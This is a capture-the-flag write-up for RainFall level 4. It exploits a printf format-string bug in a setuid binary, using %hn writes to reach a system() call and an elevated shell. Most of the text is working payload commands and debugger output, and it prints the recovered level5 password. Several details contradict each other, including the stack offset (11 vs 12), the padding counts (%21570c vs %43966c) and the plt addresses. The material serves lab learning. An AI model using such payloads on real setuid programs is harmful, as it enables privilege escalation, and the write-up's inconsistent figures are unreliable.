# Level 4

## Initial Analysis

### 1. Examine the Binary
```bash
level4@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level4 level4   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level4 level4  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level4 level4 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level5 users  5252 Mar  6  2016 level4
-rw-r--r--+ 1 level4 level4   65 Sep 23  2015 .pass
-rw-r--r--  1 level4 level4  675 Apr  3  2012 .profile

level4@RainFall:~$ file level4
level4: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf8cb2bdaa7daab1347b36aaf1c98d49529c605db, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level5** user
- When executed, runs with **level5 privileges**

### 2. Test Basic Execution
```bash
level4@RainFall:~$ ./level4
hello
hello

level4@RainFall:~$ echo "test input" | ./level4
test input

level4@RainFall:~$ ltrace ./level4
__libc_start_main(0x80484a7, 1, 0xbffff7f4, 0x80484b4, 0x8048520 <unfinished ...>
fgets("\n", 512, 0xb7fd1ac0) = 0xbffff550
printf("\n") = 1
+++ exited (status 0) +++
```

**Findings:**
- Program reads input with `fgets()` in function `n()`
- Calls function `p()` which uses `printf()` with user input - **FORMAT STRING VULNERABILITY!**
- Normal execution just echoes input and exits

### 3. Test Format String Vulnerability
```bash
level4@RainFall:~$ python -c 'print "%x %x %x %x"' | ./level4
b7ff26b0 bffff794 b7fd0ff4 0

level4@RainFall:~$ python -c 'print "AAAA" + "%x " * 15' | ./level4
AAAA b7ff26b0 bffff7f4 b7fd0ff4 0 0 bffff7b8 804848d bffff5b0 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520
```

**Critical Discovery:** 
- Format strings work! 
- Our input "AAAA" (0x41414141) appears at **position 12**

## Reverse Engineering

### 4. Function Analysis
```bash
level4@RainFall:~$ gdb level4
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048390  printf@plt
0x080483a0  fgets@plt  
0x080483b0  system@plt      ← Target function!
0x08048444  p               ← Vulnerable function
0x08048457  n               ← Main logic function  
0x080484a7  main
```

### 5. Disassembly Analysis
```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:     push   %ebp
   0x080484a8 <+1>:     mov    %esp,%ebp
   0x080484aa <+3>:     and    $0xfffffff0,%esp
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>:    leave
   0x080484b3 <+12>:    ret

(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:     push   %ebp
   0x08048458 <+1>:     mov    %esp,%ebp
   0x0804845a <+3>:     sub    $0x218,%esp      # 536 bytes for local buffer
   0x08048460 <+9>:     mov    0x8049804,%eax   # stdin
   0x08048465 <+14>:    mov    %eax,0x8(%esp)
   0x08048469 <+18>:    movl   $0x200,0x4(%esp) # 512 bytes max
   0x08048471 <+26>:    lea    -0x208(%ebp),%eax # buffer at ebp-0x208
   0x08048477 <+32>:    mov    %eax,(%esp)
   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
   0x0804847f <+40>:    lea    -0x208(%ebp),%eax 
   0x08048485 <+46>:    mov    %eax,(%esp)
   0x08048488 <+49>:    call   0x8048444 <p>    # Call vulnerable function
   0x0804848d <+54>:    mov    0x8049810,%eax   # Load target variable!
   0x08048492 <+59>:    cmp    $0x1025544,%eax  # Compare with 0x1025544
   0x08048497 <+64>:    jne    0x80484a5 <n+78>
   0x08048499 <+66>:    movl   $0x8048590,(%esp)
   0x080484a0 <+73>:    call   0x8048360 <system@plt>
   0x080484a5 <+78>:    leave
   0x080484a6 <+79>:    ret

(gdb) disas p
Dump of assembler code for function p:
   0x08048444 <+0>:     push   %ebp
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x8(%ebp),%eax    # Get buffer from n()
   0x0804844d <+9>:     mov    %eax,(%esp)
   0x08048450 <+12>:    call   0x8048340 <printf@plt>  # VULNERABILITY!
   0x08048455 <+17>:    leave
   0x08048456 <+18>:    ret
```

**Critical findings:**
- **Target address**: `0x8049810` (global variable)
- **Target value**: `0x1025544` (16,930,116 in decimal)
- **Format string bug**: `printf(user_input)` in function `p()`
- **Goal**: Write 0x1025544 to address 0x8049810 to trigger system() call

### 6. Analyze the Target
```bash
(gdb) x/x 0x8049810
0x8049810 <m>:  0x00000000

(gdb) print 0x1025544
$1 = 16930116

(gdb) print/x 16930116
$2 = 0x1025544
```

**Analysis:**
- Global variable `m` at 0x8049810 initially contains 0
- We need to write exactly 16,930,116 to trigger system()
- This value is too large for practical single %n write

## Memory Layout Analysis

### 7. Stack Layout Visualization

```
HIGH ADDRESSES
┌─────────────────┐
│   Return addr   │
│      to main    │
├─────────────────┤ ← n() frame start
│   Saved EBP     │
├─────────────────┤
│                 │
│   536 bytes     │ ← Local buffer space
│   (0x218)       │   (allocated but not all used)
├─────────────────┤
│                 │
│   Buffer        │ ← Our input stored here (512 bytes max)
│   starts at     │   lea -0x208(%ebp),%eax
│   ebp-0x208     │
│                 │
├─────────────────┤ 
│   p() args      │ ← Buffer address passed to p()
├─────────────────┤ ← p() frame start  
│   Saved EBP     │
├─────────────────┤
│   Local vars    │ ← 24 bytes (0x18)
│   (24 bytes)    │
├─────────────────┤ ← printf() call
│   printf args   │ ← Our buffer address
└─────────────────┘
LOW ADDRESSES
```

### 8. Format String Position Discovery
```bash
level4@RainFall:~$ python -c 'print "AAAA" + " %x" * 15' | ./level4
AAAA b7ff26b0 bffff7f4 b7fd0ff4 0 0 bffff7b8 804848d bffff5b0 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078

# Position analysis:
# 1: b7ff26b0  - Stack value
# 2: bffff794  - Stack value  
# 3: b7fd0ff4  - Stack value
# 4: 0         - Stack value
# 5: 0         - Stack value
# 6: bffff758  - Stack value
# 7: 804848d   - Return address in n()
# 8: bffff550  - Buffer address 
# 9: 200       - Size argument (512)
# 10: b7fd1ac0 - stdin
# 11: 41414141 - Our "AAAA" input! ← Position 12 (0-indexed = 11)
```

## Exploitation Strategy: Half-Word Writes

### 9. Understanding the Challenge
```bash
# Problem: Need to write 0x1025544 (16,930,116)
# Using %n would require printing 16,930,116 characters - impractical!
# Solution: Use %hn to write 16-bit values (half-words)

# Split 0x1025544 into two 16-bit parts:
# High word (bytes 2-3): 0x0102 = 258
# Low word  (bytes 0-1): 0x5544 = 21828
```

### 10. Memory Layout for Target Variable
```
Target Address: 0x8049810

Before exploit:
┌─────────────┬─────────────┬─────────────┬─────────────┐
│ 0x8049810   │ 0x8049811   │ 0x8049812   │ 0x8049813   │
│     00      │     00      │     00      │     00      │
└─────────────┴─────────────┴─────────────┴─────────────┘
  Low byte      2nd byte      3rd byte      High byte

After exploit (target value 0x01025544):
┌─────────────┬─────────────┬─────────────┬─────────────┐
│ 0x8049810   │ 0x8049811   │ 0x8049812   │ 0x8049813   │
│     44      │     55      │     02      │     01      │
└─────────────┴─────────────┴─────────────┴─────────────┘
  Low word = 0x5544         High word = 0x0102
  = 21828                   = 258
```

### 11. Half-Word Write Strategy
```bash
# Strategy: Use %hn to write 16-bit values
# %hn writes only the lower 16 bits of the character count

# Write sequence:
# 1. Write high word (0x0102 = 258) to address 0x8049812
# 2. Write low word  (0x5544 = 21828) to address 0x8049810

# Challenge: Must write smaller value first to avoid wraparound issues
# 258 < 21828, so write high word first
```

### 12. Stack Setup for Exploit
```
Format string payload structure:
┌────────────────┬────────────────┬─────────────┬─────────────┬─────────────┬─────────────┐
│   4 bytes      │   4 bytes      │  Variable   │      4      │  Variable   │      4      │
│ 0x8049812      │ 0x8049810      │   padding   │   bytes     │   padding   │   bytes     │
│(high addr)     │ (low addr)     │    for      │   "%12$hn"  │    for      │   "%13$hn"  │
│                │                │    258      │             │   21570     │             │
└────────────────┴────────────────┴─────────────┴─────────────┴─────────────┴─────────────┘
    Position 12      Position 13
    (0-indexed 11)   (0-indexed 12)
```

## Detailed Memory Exploitation

### 13. Character Count Calculation
```bash
# Target values:
# High word: 258 (0x0102)
# Low word:  21828 (0x5544)

# Payload structure analysis:
# 8 bytes (two addresses) + padding + format specifiers

# First write (high word):
# 8 bytes + 250 padding = 258 total → writes 0x0102 to 0x8049812

# Second write (low word):  
# 258 + 21570 padding = 21828 total → writes 0x5544 to 0x8049810
```

### 14. Stack State During printf() Execution

**Initial stack when printf() is called:**
```
Stack Position:    Content:           Description:
12 (%12$):        0x8049812          High word address  
13 (%13$):        0x8049810          Low word address
14 (%14$):        Next stack value   ...
15 (%15$):        Next stack value   ...
```

**Memory writes sequence:**
```
Step 1: Print 8 address bytes + 250 padding = 258 characters
        %12$hn writes 258 (0x0102) to address at position 12
        
Memory at 0x8049812: 0x0000 → 0x0102

Step 2: Print additional 21570 characters (total now 21828)
        %13$hn writes 21828 (0x5544) to address at position 13
        
Memory at 0x8049810: 0x0000 → 0x5544

Final memory state:
0x8049810: 0x5544  (low word)
0x8049812: 0x0102  (high word)
Combined:  0x01025544 = target value!
```

## Exploitation Implementation

### 15. Create the Exploit
```bash
level4@RainFall:~$ python -c "import struct; print(struct.pack('<I', 0x8049812) + struct.pack('<I', 0x8049810) + '%250c%12\$hn%21570c%13\$hn')" | ./level4

# Breakdown:
# struct.pack('<I', 0x8049812): Address for high word (4 bytes)
# struct.pack('<I', 0x8049810): Address for low word (4 bytes)  
# %250c: Print 250 chars (total: 8 + 250 = 258)
# %12$hn: Write 258 to address at position 12 (0x8049812)
# %43966c: Print 43966 more chars 
# %13$hn: Write (258 + 43966) % 65536 = 21828 to address at position 13
```

### 16. Memory State Visualization During Exploit

**Before printf() execution:**
```
Global variable m:
0x8049810: [00 00 00 00] = 0x00000000

Stack (relevant positions):
Position 12: 0x8049812 (high word address)
Position 13: 0x8049810 (low word address)
```

**After first %12$hn (258 characters printed):**
```
0x8049810: [00 00] [02 01] 
            ↑        ↑
         unchanged  written by %12$hn
                    (258 = 0x0102 in little-endian)
```

**After second %13$hn (21828 total characters):**
```
0x8049810: [44 55] [02 01] = 0x01025544
            ↑        ↑
      written by   unchanged
        %13$hn     from step 1
    (21828 = 0x5544)
```

### 17. Execute the Exploit
```bash
level4@RainFall:~$ python -c "import struct; print(struct.pack('<I', 0x8049812) + struct.pack('<I', 0x8049810) + '%250c%12\$hn%21570c%13\$hn')" | ./level4
[... lots of padding characters ...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

# Success! The system() call executed and revealed the flag
```

### 20. Get Interactive Shell
```bash
level4@RainFall:~$ (python -c "import struct; print(struct.pack('<I', 0x8049812) + struct.pack('<I', 0x8049810) + '%250c%12\$hn%21570c%13\$hn')"; cat) | ./level4
[... padding ...]
whoami
level5
cat /home/user/level5/.pass
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Vulnerability Analysis

### Root Cause:
- **Format string vulnerability**: `printf(user_input)` in function `p()`
- **Arbitrary memory write**: `%n` and `%hn` allow writing to any address
- **Conditional execution**: System call triggered by specific memory value

### Exploitation Technique:
1. **Stack position discovery**: Found input at position 12
2. **Target identification**: Global variable at 0x8049810
3. **Value splitting**: 32-bit value split into two 16-bit writes
4. **Memory layout abuse**: Used format string to write addresses to stack
5. **Precise character counting**: Exact calculations for target values
6. **Wraparound arithmetic**: Used 16-bit overflow for efficient exploitation

### Key Learning Points:
1. **Format string vulnerabilities** enable arbitrary memory read/write
2. **%hn modifier** writes 16-bit values, enabling precise control
3. **Stack layout analysis** critical for parameter positioning  
4. **Modular arithmetic** essential for large value exploitation
5. **Memory endianness** affects multi-byte write ordering
6. **Character count precision** determines success of exploitation

### Memory Corruption Flow:
```
User Input → fgets() → Buffer → p() → printf() → Stack Read → Memory Write → Condition Check → System Call
```